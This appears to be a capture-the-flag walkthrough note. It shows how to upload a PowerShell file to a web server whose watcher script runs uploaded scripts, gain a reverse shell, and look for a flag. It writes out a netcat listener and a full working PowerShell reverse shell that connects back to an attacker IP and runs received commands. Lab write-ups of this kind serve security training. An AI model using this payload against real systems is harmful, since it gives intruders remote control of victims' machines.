## Uploading ps1 file
As the web says you only can upload ps1 files, create one file to POST the output of `whoami /groups` from a PowerShell-only upload to a remote listener.

#Attacking_machine 
 1. Crerate a file called `reverse.ps1`.
 2. Open a netcat listener.
```
 nc -lnvp 4444
```

 3. Go to https://www.revshells.com/ and create a ps1 payload. Fiil the IP field with your ATTACKING MACHINE IP and the port with the listener port.

![[Screenshot_2025-10-24_13-39-45.png]]

4. Paste the payload  to `reverse.ps1` file.
```
$LHOST = "10.8.113.198"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

4. Upload the file from the web page.
![[Screenshot_2025-10-23_05-45-56.png]]

#netcat_listener
4. You got a reverse shell.


## Files to review

Run:
```
whoami
dir
```

![[Screenshot_2025-10-30_07-11-19-1.png]]
### File.ps1

1. Look at the content of `File.ps1`.

```
type File.ps1
```

![[Screenshot_2025-10-30_07-13-58.png]]

Here you have the content more clear.


```
$FolderPath = "C:\xampp\htdocs\uploads\"  
$FileDictionary = @{}  
# Populate the initial state of the dictionary with file names and timestamps  
$Files = Get-ChildItem -Path $FolderPath  
foreach ($file in $Files) {  
$FileDictionary[$file.Name] = $file.LastWriteTime  
}  
# Watch for changes in the directory  
while ($true) {  
Start-Sleep -Seconds 1  
# Check for changes in the directory  
$Files = Get-ChildItem -Path $FolderPath  
foreach ($file in $Files) {  
if ($FileDictionary.ContainsKey($file.Name)) {  
# Compare the current timestamp with the stored timestamp  
if ($file.LastWriteTime -ne $FileDictionary[$file.Name]) {  
Write-Host "File $($file.Name) has been modified."  
# Update the dictionary with the new timestamp  
$FileDictionary[$file.Name] = $file.LastWriteTime  
# Check if the file is executable, a PowerShell script, or a pdf document  
$extension = $file.Extension.ToLower()  
if ($extension -eq ".ps1") {  
$scriptPath = "C:\xampp\htdocs\uploads\$($file.Name)"  
try{  
#Invoke-Expression -Command "powershell.exe -ExecutionPolicy Bypass -File $scriptPath"  
Start-Job -ScriptBlock { param($scriptPath) powershell.exe -ExecutionPolicy Bypass -File $scriptPath } -ArgumentList $scriptPath  
}  
catch {  
Write-Host "An exception occurred: $_.Exception.Message"  
}  
#Write-Host "Opening file: $($file.Name)"  
#Start-Process -FilePath $file.FullName  
}  
}  
} else {  
# New file detected  
Write-Host "File $($file.Name) has been added."  
# Add the new file to the dictionary  
$FileDictionary[$file.Name] = $file.LastWriteTime  
# Check if the file is executable, a PowerShell script, or a pdf document  
$extension = $file.Extension.ToLower()  
if ($extension -eq ".ps1") {  
$scriptPath = "C:\xampp\htdocs\uploads\$($file.Name)"  
try{  
#Invoke-Expression -Command "powershell.exe -ExecutionPolicy Bypass -File $scriptPath"  
Start-Job -ScriptBlock { param($scriptPath) powershell.exe -ExecutionPolicy Bypass -File $scriptPath } -ArgumentList $scriptPath  
}  
catch {  
Write-Host "An exception occurred: $_.Exception.Message"  
}  
#Write-Host "Opening file: $($file.Name)"  
#Start-Process -FilePath $file.FullName  
}  
}  
}  
# Check for deleted files  
$deletedFiles = @()  
foreach ($fileName in $FileDictionary.Keys) {  
if (-not (Test-Path -Path (Join-Path $FolderPath $fileName))) {  
Write-Host "File $fileName has been deleted."  
# Add the deleted file to the array for removal  
$deletedFiles += $fileName  
}  
}  
# Remove the deleted files from the dictionary  
foreach ($deletedFile in $deletedFiles) {  
$FileDictionary.Remove($deletedFile)  
}  
}
```

This tells you the VM is running a loop that checks `C:\xampp\htdocs\uploads\` for new PS1s and then runs them via `Start-Job -ScriptBlock { param($scriptPath) powershell.exe -ExecutionPolicy Bypass -File $scriptPath } -ArgumentList $scriptPath` command.

2. Go to `C:\xampp\htdocs\uploads\`.
3. Check the files.
```
cd C:\xampp\htdocs\uploads\
dir
```

![[Screenshot_2025-10-30_07-23-24.png]]

There's a file called `vulnerable.ps1`.

### Vulnerable.ps1

This reverse shell lacks the privileges required to escalate to Administrator, even though itâ€™s running as the username `evader`.

### encodedflag

#netcat_listener 
Run the following commands:

```

cd ..
cd Desktop
```

![[Screenshot_2025-10-24_14-11-30.png]]

There's a file called `encodedflag`.

**Next step:** [[User level flag]]